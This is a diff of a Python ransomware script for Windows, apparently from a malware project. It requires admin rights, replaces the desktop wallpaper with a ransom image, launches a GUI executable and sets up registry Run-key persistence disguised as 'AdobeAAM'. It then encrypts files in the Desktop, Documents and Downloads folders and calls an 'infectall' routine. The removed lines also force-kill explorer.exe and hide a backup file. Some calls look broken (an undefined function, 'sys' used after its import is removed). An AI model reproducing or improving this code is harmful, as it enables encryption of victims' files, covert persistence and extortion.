@@ -1,45 +1,37 @@
-from Functions.Encrypt_Func import Crypt
-from Functions.Encrypt_Func import k
-from Functions.Encrypt_Func import s
-from os import path,getenv
-from sys import argv
-from os import system as sys
+from Functions.Encrypt_Func import Crypt,k,s
+from ctypes import windll
+from os import path,getenv,startfile
+from sys import argv,exit
 from shutil import copyfile
 from winreg import *
 
+if(Crypt.check_if_is_admin()==False):
+	sys.exit(1)
+
 if s=='Windows':
+	RainWarning()
+
 	desktop = path.expanduser('~/Desktop')
 	documents = path.expanduser('~/Documents')
 	downloads = path.expanduser('~/Downloads')
 
 	Crypt.check_w_key(documents)
 
-	try:
-		bg = Crypt.resource_path('bg.jpg')
-	except:
-		pass
+	bg = Crypt.resource_path('bg.jpg')
+	Crypt.resource_path('GUI.exe')
 
 	try:
-		appdata = getenv('APPDATA')
-		dest = appdata+'/Microsoft/Windows/Themes'
-		copyfile(dest+'/TranscodedWallpaper',dest+'/.transold')
-		copyfile(bg,dest+"/TranscodedWallpaper")
-		sys('cd '+dest)
-		sys('attrib +s +h '+dest+'/.transold')
-		sys("taskkill /f /im explorer.exe")
-		sys("start C:/Windows/explorer.exe")
+		appdt = getenv('APPDATA')
+		copyfile(appdt+'/Microsoft/Windows/Themes/TranscodedWallpaper',appdt+'/Microsoft/Windows/Themes/.transold')
 	except:
+		pass
+	finally:
 		try:
-			appdata = getenv('APPDATA')
-			dest = appdata+'/Microsoft/Windows/Themes'
-			copyfile(dest+'/TranscodedWallpaper.jpg',dest+'/.transold')
-			copyfile(bg,dest+"/TranscodedWallpaper.jpg")
-			sys('cd '+dest)
-			sys('attrib +s +h '+dest+'/.transold')
-			sys("taskkill /f /im explorer.exe")
-			sys("start C:/Windows/explorer.exe")
+			windll.user32.SystemParametersInfoW(20,0,bg,0)
 		except:
 			pass
+
+	startfile('GUI.exe')
 
 	keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 	try:
@@ -56,13 +48,15 @@ if s=='Windows':
 		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
 	except:
 		pass
+	finally:
+		CloseKey(key)
 
 	Crypt.c_iterator(desktop)
 	Crypt.c_iterator(documents)
 	Crypt.c_iterator(downloads)
 
 	Crypt.infectall()
-
+	
 elif s=='Linux':
 	desktop = path.expanduser('~/Desktop')
 	documents = path.expanduser('~/Documents')
